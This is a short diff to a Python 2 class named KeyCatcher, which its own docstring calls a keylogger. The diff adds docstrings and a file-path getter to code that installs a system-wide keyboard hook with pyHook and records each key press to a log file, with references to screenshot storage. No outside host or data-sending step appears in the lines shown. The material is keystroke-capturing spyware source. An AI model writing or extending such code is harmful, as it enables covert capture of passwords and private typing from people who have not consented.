@@ -17,7 +17,11 @@ class KeyCatcher:
     """
     manage the keylogger's actions
     """
+
     def __init__(self, data_path=CURRENT_PATH):
+        """
+        sets the logger
+        """
         self.data_info = DataInfo.DataInfo(data_path, "log", "screenshot", "self")
         self.data = ""
         self.data_info.new_data_file("data_file.log")
@@ -25,12 +29,22 @@ class KeyCatcher:
         self.hm = pyHook.HookManager()
 
     def set_key_hook(self):
+        """
+        set hooks for events
+        """
         # watch for events
         self.hm.KeyDown = self.key_press
         # set the hook
         self.hm.HookKeyboard()
 
+    def get_data_file_path(self):
+        return self.data_info.get_file_path_by_type(DATA_FILE_NAME)
+
     def key_press(self, event):
+        """
+        handle key presses by inserting them to the file
+        @param event: key press event
+        """
         print 'MessageName:', event.MessageName
         print 'Message:', event.Message
         print 'Time:', event.Time
